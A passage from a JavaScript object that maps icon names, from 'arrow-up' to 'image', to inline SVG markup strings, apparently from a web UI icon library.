            "arrow-up": '<svg width="20" height="20" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><polygon points="10.5,4 15.37,9.4 14.63,10.08 10.5,5.49 6.37,10.08 5.63,9.4"/><line fill="none" stroke="#000" x1="10.5" y1="16" x2="10.5" y2="5"/></svg>',
            ban: '<svg width="20" height="20" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><circle fill="none" stroke="#000" stroke-width="1.1" cx="10" cy="10" r="9"/><line fill="none" stroke="#000" stroke-width="1.1" x1="4" y1="3.5" x2="16" y2="16.5"/></svg>',
            behance: '<svg width="20" height="20" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><path d="M9.5,10.6c-0.4-0.5-0.9-0.9-1.6-1.1c1.7-1,2.2-3.2,0.7-4.7C7.8,4,6.3,4,5.2,4C3.5,4,1.7,4,0,4v12c1.7,0,3.4,0,5.2,0 c1,0,2.1,0,3.1-0.5C10.2,14.6,10.5,12.3,9.5,10.6L9.5,10.6z M5.6,6.1c1.8,0,1.8,2.7-0.1,2.7c-1,0-2,0-2.9,0V6.1H5.6z M2.6,13.8v-3.1 c1.1,0,2.1,0,3.2,0c2.1,0,2.1,3.2,0.1,3.2L2.6,13.8z"/><path d="M19.9,10.9C19.7,9.2,18.7,7.6,17,7c-4.2-1.3-7.3,3.4-5.3,7.1c0.9,1.7,2.8,2.3,4.7,2.1c1.7-0.2,2.9-1.3,3.4-2.9h-2.2 c-0.4,1.3-2.4,1.5-3.5,0.6c-0.4-0.4-0.6-1.1-0.6-1.7H20C20,11.7,19.9,10.9,19.9,10.9z M13.5,10.6c0-1.6,2.3-2.7,3.5-1.4 c0.4,0.4,0.5,0.9,0.6,1.4H13.5L13.5,10.6z"/><rect x="13" y="4" width="5" height="1.4"/></svg>',
            bell: '<svg width="20" height="20" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><path fill="none" stroke="#000" stroke-width="1.1" d="M17,15.5 L3,15.5 C2.99,14.61 3.79,13.34 4.1,12.51 C4.58,11.3 4.72,10.35 5.19,7.01 C5.54,4.53 5.89,3.2 7.28,2.16 C8.13,1.56 9.37,1.5 9.81,1.5 L9.96,1.5 C9.96,1.5 11.62,1.41 12.67,2.17 C14.08,3.2 14.42,4.54 14.77,7.02 C15.26,10.35 15.4,11.31 15.87,12.52 C16.2,13.34 17.01,14.61 17,15.5 L17,15.5 Z"/><path fill="none" stroke="#000" d="M12.39,16 C12.39,17.37 11.35,18.43 9.91,18.43 C8.48,18.43 7.42,17.37 7.42,16"/></svg>',
            bold: '<svg width="20" height="20" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><path d="M5,15.3 C5.66,15.3 5.9,15 5.9,14.53 L5.9,5.5 C5.9,4.92 5.56,4.7 5,4.7 L5,4 L8.95,4 C12.6,4 13.7,5.37 13.7,6.9 C13.7,7.87 13.14,9.17 10.86,9.59 L10.86,9.7 C13.25,9.86 14.29,11.28 14.3,12.54 C14.3,14.47 12.94,16 9,16 L5,16 L5,15.3 Z M9,9.3 C11.19,9.3 11.8,8.5 11.85,7 C11.85,5.65 11.3,4.8 9,4.8 L7.67,4.8 L7.67,9.3 L9,9.3 Z M9.185,15.22 C11.97,15 12.39,14 12.4,12.58 C12.4,11.15 11.39,10 9,10 L7.67,10 L7.67,15 L9.18,15 Z"/></svg>',
            bolt: '<svg width="20" height="20" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><path d="M4.74,20 L7.73,12 L3,12 L15.43,1 L12.32,9 L17.02,9 L4.74,20 L4.74,20 L4.74,20 Z M9.18,11 L7.1,16.39 L14.47,10 L10.86,10 L12.99,4.67 L5.61,11 L9.18,11 L9.18,11 L9.18,11 Z"/></svg>',
            bookmark: '<svg width="20" height="20" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><polygon fill="none" stroke="#000" points="5.5 1.5 15.5 1.5 15.5 17.5 10.5 12.5 5.5 17.5"/></svg>',
            calendar: '<svg width="20" height="20" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><path d="M 2,3 2,17 18,17 18,3 2,3 Z M 17,16 3,16 3,8 17,8 17,16 Z M 17,7 3,7 3,4 17,4 17,7 Z"/><rect width="1" height="3" x="6" y="2"/><rect width="1" height="3" x="13" y="2"/></svg>',
            camera: '<svg width="20" height="20" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><circle fill="none" stroke="#000" stroke-width="1.1" cx="10" cy="10.8" r="3.8"/><path fill="none" stroke="#000" d="M1,4.5 C0.7,4.5 0.5,4.7 0.5,5 L0.5,17 C0.5,17.3 0.7,17.5 1,17.5 L19,17.5 C19.3,17.5 19.5,17.3 19.5,17 L19.5,5 C19.5,4.7 19.3,4.5 19,4.5 L13.5,4.5 L13.5,2.9 C13.5,2.6 13.3,2.5 13,2.5 L7,2.5 C6.7,2.5 6.5,2.6 6.5,2.9 L6.5,4.5 L1,4.5 L1,4.5 Z"/></svg>',
            cart: '<svg width="20" height="20" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><circle cx="7.3" cy="17.3" r="1.4"/><circle cx="13.3" cy="17.3" r="1.4"/><polyline fill="none" stroke="#000" points="0 2 3.2 4 5.3 12.5 16 12.5 18 6.5 8 6.5"/></svg>',
            check: '<svg width="20" height="20" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><polyline fill="none" stroke="#000" stroke-width="1.1" points="4,10 8,15 17,4"/></svg>',
            "chevron-double-left": '<svg width="20" height="20" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><polyline fill="none" stroke="#000" stroke-width="1.03" points="10 14 6 10 10 6"/><polyline fill="none" stroke="#000" stroke-width="1.03" points="14 14 10 10 14 6"/></svg>',
            "chevron-double-right": '<svg width="20" height="20" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><polyline fill="none" stroke="#000" stroke-width="1.03" points="10 6 14 10 10 14"/><polyline fill="none" stroke="#000" stroke-width="1.03" points="6 6 10 10 6 14"/></svg>',
            "chevron-down": '<svg width="20" height="20" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><polyline fill="none" stroke="#000" stroke-width="1.03" points="16 7 10 13 4 7"/></svg>',
            "chevron-left": '<svg width="20" height="20" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><polyline fill="none" stroke="#000" stroke-width="1.03" points="13 16 7 10 13 4"/></svg>',
            "chevron-right": '<svg width="20" height="20" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><polyline fill="none" stroke="#000" stroke-width="1.03" points="7 4 13 10 7 16"/></svg>',
            "chevron-up": '<svg width="20" height="20" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><polyline fill="none" stroke="#000" stroke-width="1.03" points="4 13 10 7 16 13"/></svg>',
            clock: '<svg width="20" height="20" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><circle fill="none" stroke="#000" stroke-width="1.1" cx="10" cy="10" r="9"/><rect x="9" y="4" width="1" height="7"/><path fill="none" stroke="#000" stroke-width="1.1" d="M13.018,14.197 L9.445,10.625"/></svg>',
            close: '<svg width="20" height="20" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><path fill="none" stroke="#000" stroke-width="1.06" d="M16,16 L4,4"/><path fill="none" stroke="#000" stroke-width="1.06" d="M16,4 L4,16"/></svg>',
            "cloud-download": '<svg width="20" height="20" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><path fill="none" stroke="#000" stroke-width="1.1" d="M6.5,14.61 L3.75,14.61 C1.96,14.61 0.5,13.17 0.5,11.39 C0.5,9.76 1.72,8.41 3.3,8.2 C3.38,5.31 5.75,3 8.68,3 C11.19,3 13.31,4.71 13.89,7.02 C14.39,6.8 14.93,6.68 15.5,6.68 C17.71,6.68 19.5,8.45 19.5,10.64 C19.5,12.83 17.71,14.6 15.5,14.6 L12.5,14.6"/><polyline fill="none" stroke="#000" points="11.75 16 9.5 18.25 7.25 16"/><path fill="none" stroke="#000" d="M9.5,18 L9.5,9.5"/></svg>',
            "cloud-upload": '<svg width="20" height="20" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><path fill="none" stroke="#000" stroke-width="1.1" d="M6.5,14.61 L3.75,14.61 C1.96,14.61 0.5,13.17 0.5,11.39 C0.5,9.76 1.72,8.41 3.31,8.2 C3.38,5.31 5.75,3 8.68,3 C11.19,3 13.31,4.71 13.89,7.02 C14.39,6.8 14.93,6.68 15.5,6.68 C17.71,6.68 19.5,8.45 19.5,10.64 C19.5,12.83 17.71,14.6 15.5,14.6 L12.5,14.6"/><polyline fill="none" stroke="#000" points="7.25 11.75 9.5 9.5 11.75 11.75"/><path fill="none" stroke="#000" d="M9.5,18 L9.5,9.5"/></svg>',
            code: '<svg width="20" height="20" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><polyline fill="none" stroke="#000" stroke-width="1.01" points="13,4 19,10 13,16"/><polyline fill="none" stroke="#000" stroke-width="1.01" points="7,4 1,10 7,16"/></svg>',
            cog: '<svg width="20" height="20" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><circle fill="none" stroke="#000" cx="9.997" cy="10" r="3.31"/><path fill="none" stroke="#000" d="M18.488,12.285 L16.205,16.237 C15.322,15.496 14.185,15.281 13.303,15.791 C12.428,16.289 12.047,17.373 12.246,18.5 L7.735,18.5 C7.938,17.374 7.553,16.299 6.684,15.791 C5.801,15.27 4.655,15.492 3.773,16.237 L1.5,12.285 C2.573,11.871 3.317,10.999 3.317,9.991 C3.305,8.98 2.573,8.121 1.5,7.716 L3.765,3.784 C4.645,4.516 5.794,4.738 6.687,4.232 C7.555,3.722 7.939,2.637 7.735,1.5 L12.263,1.5 C12.072,2.637 12.441,3.71 13.314,4.22 C14.206,4.73 15.343,4.516 16.225,3.794 L18.487,7.714 C17.404,8.117 16.661,8.988 16.67,10.009 C16.672,11.018 17.415,11.88 18.488,12.285 L18.488,12.285 Z"/></svg>',
            comment: '<svg width="20" height="20" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><path d="M6,18.71 L6,14 L1,14 L1,1 L19,1 L19,14 L10.71,14 L6,18.71 L6,18.71 Z M2,13 L7,13 L7,16.29 L10.29,13 L18,13 L18,2 L2,2 L2,13 L2,13 Z"/></svg>',
            commenting: '<svg width="20" height="20" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><polygon fill="none" stroke="#000" points="1.5,1.5 18.5,1.5 18.5,13.5 10.5,13.5 6.5,17.5 6.5,13.5 1.5,13.5"/><circle cx="10" cy="8" r="1"/><circle cx="6" cy="8" r="1"/><circle cx="14" cy="8" r="1"/></svg>',
            comments: '<svg width="20" height="20" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><polyline fill="none" stroke="#000" points="2 0.5 19.5 0.5 19.5 13"/><path d="M5,19.71 L5,15 L0,15 L0,2 L18,2 L18,15 L9.71,15 L5,19.71 L5,19.71 L5,19.71 Z M1,14 L6,14 L6,17.29 L9.29,14 L17,14 L17,3 L1,3 L1,14 L1,14 L1,14 Z"/></svg>',
            copy: '<svg width="20" height="20" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><rect fill="none" stroke="#000" x="3.5" y="2.5" width="12" height="16"/><polyline fill="none" stroke="#000" points="5 0.5 17.5 0.5 17.5 17"/></svg>',
            "credit-card": '<svg width="20" height="20" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><rect fill="none" stroke="#000" x="1.5" y="4.5" width="17" height="12"/><rect x="1" y="7" width="18" height="3"/></svg>',
            database: '<svg width="20" height="20" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><ellipse fill="none" stroke="#000" cx="10" cy="4.64" rx="7.5" ry="3.14"/><path fill="none" stroke="#000" d="M17.5,8.11 C17.5,9.85 14.14,11.25 10,11.25 C5.86,11.25 2.5,9.84 2.5,8.11"/><path fill="none" stroke="#000" d="M17.5,11.25 C17.5,12.99 14.14,14.39 10,14.39 C5.86,14.39 2.5,12.98 2.5,11.25"/><path fill="none" stroke="#000" d="M17.49,4.64 L17.5,14.36 C17.5,16.1 14.14,17.5 10,17.5 C5.86,17.5 2.5,16.09 2.5,14.36 L2.5,4.64"/></svg>',
            desktop: '<svg width="20" height="20" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><rect x="8" y="15" width="1" height="2"/><rect x="11" y="15" width="1" height="2"/><rect x="5" y="16" width="10" height="1"/><rect fill="none" stroke="#000" x="1.5" y="3.5" width="17" height="11"/></svg>',
            download: '<svg width="20" height="20" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><polyline fill="none" stroke="#000" points="14,10 9.5,14.5 5,10"/><rect x="3" y="17" width="13" height="1"/><line fill="none" stroke="#000" x1="9.5" y1="13.91" x2="9.5" y2="3"/></svg>',
            dribbble: '<svg width="20" height="20" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><path fill="none" stroke="#000" stroke-width="1.4" d="M1.3,8.9c0,0,5,0.1,8.6-1c1.4-0.4,2.6-0.9,4-1.9 c1.4-1.1,2.5-2.5,2.5-2.5"/><path fill="none" stroke="#000" stroke-width="1.4" d="M3.9,16.6c0,0,1.7-2.8,3.5-4.2 c1.8-1.3,4-2,5.7-2.2C16,10,19,10.6,19,10.6"/><path fill="none" stroke="#000" stroke-width="1.4" d="M6.9,1.6c0,0,3.3,4.6,4.2,6.8 c0.4,0.9,1.3,3.1,1.9,5.2c0.6,2,0.9,4.4,0.9,4.4"/><circle fill="none" stroke="#000" stroke-width="1.4" cx="10" cy="10" r="9"/></svg>',
            expand: '<svg width="20" height="20" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><polygon points="13 2 18 2 18 7 17 7 17 3 13 3"/><polygon points="2 13 3 13 3 17 7 17 7 18 2 18"/><path fill="none" stroke="#000" stroke-width="1.1" d="M11,9 L17,3"/><path fill="none" stroke="#000" stroke-width="1.1" d="M3,17 L9,11"/></svg>',
            facebook: '<svg width="20" height="20" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><path d="M11,10h2.6l0.4-3H11V5.3c0-0.9,0.2-1.5,1.5-1.5H14V1.1c-0.3,0-1-0.1-2.1-0.1C9.6,1,8,2.4,8,5v2H5.5v3H8v8h3V10z"/></svg>',
            "file-edit": '<svg width="20" height="20" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><path fill="none" stroke="#000" d="M18.65,1.68 C18.41,1.45 18.109,1.33 17.81,1.33 C17.499,1.33 17.209,1.45 16.98,1.68 L8.92,9.76 L8,12.33 L10.55,11.41 L18.651,3.34 C19.12,2.87 19.12,2.15 18.65,1.68 L18.65,1.68 L18.65,1.68 Z"/><polyline fill="none" stroke="#000" points="16.5 8.482 16.5 18.5 3.5 18.5 3.5 1.5 14.211 1.5"/></svg>',
            "file-pdf": '<svg width="20" height="20" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><rect fill="none" stroke="#000" width="13" height="17" x="3.5" y="1.5"/><path d="M14.65 11.67c-.48.3-1.37-.19-1.79-.37a4.65 4.65 0 0 1 1.49.06c.35.1.36.28.3.31zm-6.3.06l.43-.79a14.7 14.7 0 0 0 .75-1.64 5.48 5.48 0 0 0 1.25 1.55l.2.15a16.36 16.36 0 0 0-2.63.73zM9.5 5.32c.2 0 .32.5.32.97a1.99 1.99 0 0 1-.23 1.04 5.05 5.05 0 0 1-.17-1.3s0-.71.08-.71zm-3.9 9a4.35 4.35 0 0 1 1.21-1.46l.24-.22a4.35 4.35 0 0 1-1.46 1.68zm9.23-3.3a2.05 2.05 0 0 0-1.32-.3 11.07 11.07 0 0 0-1.58.11 4.09 4.09 0 0 1-.74-.5 5.39 5.39 0 0 1-1.32-2.06 10.37 10.37 0 0 0 .28-2.62 1.83 1.83 0 0 0-.07-.25.57.57 0 0 0-.52-.4H9.4a.59.59 0 0 0-.6.38 6.95 6.95 0 0 0 .37 3.14c-.26.63-1 2.12-1 2.12-.3.58-.57 1.08-.82 1.5l-.8.44A3.11 3.11 0 0 0 5 14.16a.39.39 0 0 0 .15.42l.24.13c1.15.56 2.28-1.74 2.66-2.42a23.1 23.1 0 0 1 3.59-.85 4.56 4.56 0 0 0 2.91.8.5.5 0 0 0 .3-.21 1.1 1.1 0 0 0 .12-.75.84.84 0 0 0-.14-.25z"/></svg>',
            "file-text": '<svg width="20" height="20" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><rect fill="none" stroke="#000" width="13" height="17" x="3.5" y="1.5"/><line fill="none" stroke="#000" x1="6" x2="12" y1="12.5" y2="12.5"/><line fill="none" stroke="#000" x1="6" x2="14" y1="8.5" y2="8.5"/><line fill="none" stroke="#000" x1="6" x2="14" y1="6.5" y2="6.5"/><line fill="none" stroke="#000" x1="6" x2="14" y1="10.5" y2="10.5"/></svg>',
            file: '<svg width="20" height="20" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><rect fill="none" stroke="#000" x="3.5" y="1.5" width="13" height="17"/></svg>',
            flickr: '<svg width="20" height="20" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><circle cx="5.5" cy="9.5" r="3.5"/><circle cx="14.5" cy="9.5" r="3.5"/></svg>',
            folder: '<svg width="20" height="20" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><polygon fill="none" stroke="#000" points="9.5 5.5 8.5 3.5 1.5 3.5 1.5 16.5 18.5 16.5 18.5 5.5"/></svg>',
            forward: '<svg width="20" height="20" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><path d="M2.47,13.11 C4.02,10.02 6.27,7.85 9.04,6.61 C9.48,6.41 10.27,6.13 11,5.91 L11,2 L18.89,9 L11,16 L11,12.13 C9.25,12.47 7.58,13.19 6.02,14.25 C3.03,16.28 1.63,18.54 1.63,18.54 C1.63,18.54 1.38,15.28 2.47,13.11 L2.47,13.11 Z M5.3,13.53 C6.92,12.4 9.04,11.4 12,10.92 L12,13.63 L17.36,9 L12,4.25 L12,6.8 C11.71,6.86 10.86,7.02 9.67,7.49 C6.79,8.65 4.58,10.96 3.49,13.08 C3.18,13.7 2.68,14.87 2.49,16 C3.28,15.05 4.4,14.15 5.3,13.53 L5.3,13.53 Z"/></svg>',
            foursquare: '<svg width="20" height="20" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><path d="M15.23,2 C15.96,2 16.4,2.41 16.5,2.86 C16.57,3.15 16.56,3.44 16.51,3.73 C16.46,4.04 14.86,11.72 14.75,12.03 C14.56,12.56 14.16,12.82 13.61,12.83 C13.03,12.84 11.09,12.51 10.69,13 C10.38,13.38 7.79,16.39 6.81,17.53 C6.61,17.76 6.4,17.96 6.08,17.99 C5.68,18.04 5.29,17.87 5.17,17.45 C5.12,17.28 5.1,17.09 5.1,16.91 C5.1,12.4 4.86,7.81 5.11,3.31 C5.17,2.5 5.81,2.12 6.53,2 L15.23,2 L15.23,2 Z M9.76,11.42 C9.94,11.19 10.17,11.1 10.45,11.1 L12.86,11.1 C13.12,11.1 13.31,10.94 13.36,10.69 C13.37,10.64 13.62,9.41 13.74,8.83 C13.81,8.52 13.53,8.28 13.27,8.28 C12.35,8.29 11.42,8.28 10.5,8.28 C9.84,8.28 9.83,7.69 9.82,7.21 C9.8,6.85 10.13,6.55 10.5,6.55 C11.59,6.56 12.67,6.55 13.76,6.55 C14.03,6.55 14.23,6.4 14.28,6.14 C14.34,5.87 14.67,4.29 14.67,4.29 C14.67,4.29 14.82,3.74 14.19,3.74 L7.34,3.74 C7,3.75 6.84,4.02 6.84,4.33 C6.84,7.58 6.85,14.95 6.85,14.99 C6.87,15 8.89,12.51 9.76,11.42 L9.76,11.42 Z"/></svg>',
            future: '<svg width="20" height="20" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><polyline points="19 2 18 2 18 6 14 6 14 7 19 7 19 2"/><path fill="none" stroke="#000" stroke-width="1.1" d="M18,6.548 C16.709,3.29 13.354,1 9.6,1 C4.6,1 0.6,5 0.6,10 C0.6,15 4.6,19 9.6,19 C14.6,19 18.6,15 18.6,10"/><rect x="9" y="4" width="1" height="7"/><path d="M13.018,14.197 L9.445,10.625" fill="none" stroke="#000" stroke-width="1.1"/></svg>',
            "git-branch": '<svg width="20" height="20" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><circle fill="none" stroke="#000" stroke-width="1.2" cx="7" cy="3" r="2"/><circle fill="none" stroke="#000" stroke-width="1.2" cx="14" cy="6" r="2"/><circle fill="none" stroke="#000" stroke-width="1.2" cx="7" cy="17" r="2"/><path fill="none" stroke="#000" stroke-width="2" d="M14,8 C14,10.41 12.43,10.87 10.56,11.25 C9.09,11.54 7,12.06 7,15 L7,5"/></svg>',
            "git-fork": '<svg width="20" height="20" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><circle fill="none" stroke="#000" stroke-width="1.2" cx="5.79" cy="2.79" r="1.79"/><circle fill="none" stroke="#000" stroke-width="1.2" cx="14.19" cy="2.79" r="1.79"/><ellipse fill="none" stroke="#000" stroke-width="1.2" cx="10.03" cy="16.79" rx="1.79" ry="1.79"/><path fill="none" stroke="#000" stroke-width="2" d="M5.79,4.57 L5.79,6.56 C5.79,9.19 10.03,10.22 10.03,13.31 C10.03,14.86 10.04,14.55 10.04,14.55 C10.04,14.37 10.04,14.86 10.04,13.31 C10.04,10.22 14.2,9.19 14.2,6.56 L14.2,4.57"/></svg>',
            "github-alt": '<svg width="20" height="20" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><path d="M10,0.5 C4.75,0.5 0.5,4.76 0.5,10.01 C0.5,15.26 4.75,19.51 10,19.51 C15.24,19.51 19.5,15.26 19.5,10.01 C19.5,4.76 15.25,0.5 10,0.5 L10,0.5 Z M12.81,17.69 C12.81,17.69 12.81,17.7 12.79,17.69 C12.47,17.75 12.35,17.59 12.35,17.36 L12.35,16.17 C12.35,15.45 12.09,14.92 11.58,14.56 C12.2,14.51 12.77,14.39 13.26,14.21 C13.87,13.98 14.36,13.69 14.74,13.29 C15.42,12.59 15.76,11.55 15.76,10.17 C15.76,9.25 15.45,8.46 14.83,7.8 C15.1,7.08 15.07,6.29 14.75,5.44 L14.51,5.42 C14.34,5.4 14.06,5.46 13.67,5.61 C13.25,5.78 12.79,6.03 12.31,6.35 C11.55,6.16 10.81,6.05 10.09,6.05 C9.36,6.05 8.61,6.15 7.88,6.35 C7.28,5.96 6.75,5.68 6.26,5.54 C6.07,5.47 5.9,5.44 5.78,5.44 L5.42,5.44 C5.06,6.29 5.04,7.08 5.32,7.8 C4.7,8.46 4.4,9.25 4.4,10.17 C4.4,11.94 4.96,13.16 6.08,13.84 C6.53,14.13 7.05,14.32 7.69,14.43 C8.03,14.5 8.32,14.54 8.55,14.55 C8.07,14.89 7.82,15.42 7.82,16.16 L7.82,17.51 C7.8,17.69 7.7,17.8 7.51,17.8 C4.21,16.74 1.82,13.65 1.82,10.01 C1.82,5.5 5.49,1.83 10,1.83 C14.5,1.83 18.17,5.5 18.17,10.01 C18.18,13.53 15.94,16.54 12.81,17.69 L12.81,17.69 Z"/></svg>',
            github: '<svg width="20" height="20" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><path d="M10,1 C5.03,1 1,5.03 1,10 C1,13.98 3.58,17.35 7.16,18.54 C7.61,18.62 7.77,18.34 7.77,18.11 C7.77,17.9 7.76,17.33 7.76,16.58 C5.26,17.12 4.73,15.37 4.73,15.37 C4.32,14.33 3.73,14.05 3.73,14.05 C2.91,13.5 3.79,13.5 3.79,13.5 C4.69,13.56 5.17,14.43 5.17,14.43 C5.97,15.8 7.28,15.41 7.79,15.18 C7.87,14.6 8.1,14.2 8.36,13.98 C6.36,13.75 4.26,12.98 4.26,9.53 C4.26,8.55 4.61,7.74 5.19,7.11 C5.1,6.88 4.79,5.97 5.28,4.73 C5.28,4.73 6.04,4.49 7.75,5.65 C8.47,5.45 9.24,5.35 10,5.35 C10.76,5.35 11.53,5.45 12.25,5.65 C13.97,4.48 14.72,4.73 14.72,4.73 C15.21,5.97 14.9,6.88 14.81,7.11 C15.39,7.74 15.73,8.54 15.73,9.53 C15.73,12.99 13.63,13.75 11.62,13.97 C11.94,14.25 12.23,14.8 12.23,15.64 C12.23,16.84 12.22,17.81 12.22,18.11 C12.22,18.35 12.38,18.63 12.84,18.54 C16.42,17.35 19,13.98 19,10 C19,5.03 14.97,1 10,1 L10,1 Z"/></svg>',
            gitter: '<svg width="20" height="20" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><rect x="3.5" y="1" width="1.531" height="11.471"/><rect x="7.324" y="4.059" width="1.529" height="15.294"/><rect x="11.148" y="4.059" width="1.527" height="15.294"/><rect x="14.971" y="4.059" width="1.529" height="8.412"/></svg>',
            "google-plus": '<svg width="20" height="20" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><path d="M12.9,9c0,2.7-0.6,5-3.2,6.3c-3.7,1.8-8.1,0.2-9.4-3.6C-1.1,7.6,1.9,3.3,6.1,3c1.7-0.1,3.2,0.3,4.6,1.3 c0.1,0.1,0.3,0.2,0.4,0.4c-0.5,0.5-1.2,1-1.7,1.6c-1-0.8-2.1-1.1-3.5-0.9C5,5.6,4.2,6,3.6,6.7c-1.3,1.3-1.5,3.4-0.5,5 c1,1.7,2.6,2.3,4.6,1.9c1.4-0.3,2.4-1.2,2.6-2.6H6.9V9H12.9z"/><polygon points="20,9 20,11 18,11 18,13 16,13 16,11 14,11 14,9 16,9 16,7 18,7 18,9"/></svg>',
            google: '<svg width="20" height="20" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><path d="M17.86,9.09 C18.46,12.12 17.14,16.05 13.81,17.56 C9.45,19.53 4.13,17.68 2.47,12.87 C0.68,7.68 4.22,2.42 9.5,2.03 C11.57,1.88 13.42,2.37 15.05,3.65 C15.22,3.78 15.37,3.93 15.61,4.14 C14.9,4.81 14.23,5.45 13.5,6.14 C12.27,5.08 10.84,4.72 9.28,4.98 C8.12,5.17 7.16,5.76 6.37,6.63 C4.88,8.27 4.62,10.86 5.76,12.82 C6.95,14.87 9.17,15.8 11.57,15.25 C13.27,14.87 14.76,13.33 14.89,11.75 L10.51,11.75 L10.51,9.09 L17.86,9.09 L17.86,9.09 Z"/></svg>',
            grid: '<svg width="20" height="20" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><rect x="2" y="2" width="3" height="3"/><rect x="8" y="2" width="3" height="3"/><rect x="14" y="2" width="3" height="3"/><rect x="2" y="8" width="3" height="3"/><rect x="8" y="8" width="3" height="3"/><rect x="14" y="8" width="3" height="3"/><rect x="2" y="14" width="3" height="3"/><rect x="8" y="14" width="3" height="3"/><rect x="14" y="14" width="3" height="3"/></svg>',
            happy: '<svg width="20" height="20" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><circle cx="13" cy="7" r="1"/><circle cx="7" cy="7" r="1"/><circle fill="none" stroke="#000" cx="10" cy="10" r="8.5"/><path fill="none" stroke="#000" d="M14.6,11.4 C13.9,13.3 12.1,14.5 10,14.5 C7.9,14.5 6.1,13.3 5.4,11.4"/></svg>',
            hashtag: '<svg width="20" height="20" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><path d="M15.431,8 L15.661,7 L12.911,7 L13.831,3 L12.901,3 L11.98,7 L9.29,7 L10.21,3 L9.281,3 L8.361,7 L5.23,7 L5,8 L8.13,8 L7.21,12 L4.23,12 L4,13 L6.98,13 L6.061,17 L6.991,17 L7.911,13 L10.601,13 L9.681,17 L10.611,17 L11.531,13 L14.431,13 L14.661,12 L11.76,12 L12.681,8 L15.431,8 Z M10.831,12 L8.141,12 L9.061,8 L11.75,8 L10.831,12 Z"/></svg>',
            heart: '<svg width="20" height="20" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><path fill="none" stroke="#000" stroke-width="1.03" d="M10,4 C10,4 8.1,2 5.74,2 C3.38,2 1,3.55 1,6.73 C1,8.84 2.67,10.44 2.67,10.44 L10,18 L17.33,10.44 C17.33,10.44 19,8.84 19,6.73 C19,3.55 16.62,2 14.26,2 C11.9,2 10,4 10,4 L10,4 Z"/></svg>',
            history: '<svg width="20" height="20" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><polyline fill="#000" points="1 2 2 2 2 6 6 6 6 7 1 7 1 2"/><path fill="none" stroke="#000" stroke-width="1.1" d="M2.1,6.548 C3.391,3.29 6.746,1 10.5,1 C15.5,1 19.5,5 19.5,10 C19.5,15 15.5,19 10.5,19 C5.5,19 1.5,15 1.5,10"/><rect x="9" y="4" width="1" height="7"/><path fill="none" stroke="#000" stroke-width="1.1" d="M13.018,14.197 L9.445,10.625"/></svg>',
            home: '<svg width="20" height="20" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><polygon points="18.65 11.35 10 2.71 1.35 11.35 0.65 10.65 10 1.29 19.35 10.65"/><polygon points="15 4 18 4 18 7 17 7 17 5 15 5"/><polygon points="3 11 4 11 4 18 7 18 7 12 12 12 12 18 16 18 16 11 17 11 17 19 11 19 11 13 8 13 8 19 3 19"/></svg>',
            image: '<svg width="20" height="20" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><circle cx="16.1" cy="6.1" r="1.1"/><rect fill="none" stroke="#000" x=".5" y="2.5" width="19" height="15"/><polyline fill="none" stroke="#000" stroke-width="1.01" points="4,13 8,9 13,14"/><polyline fill="none" stroke="#000" stroke-width="1.01" points="11,12 12.5,10.5 16,14"/></svg>',
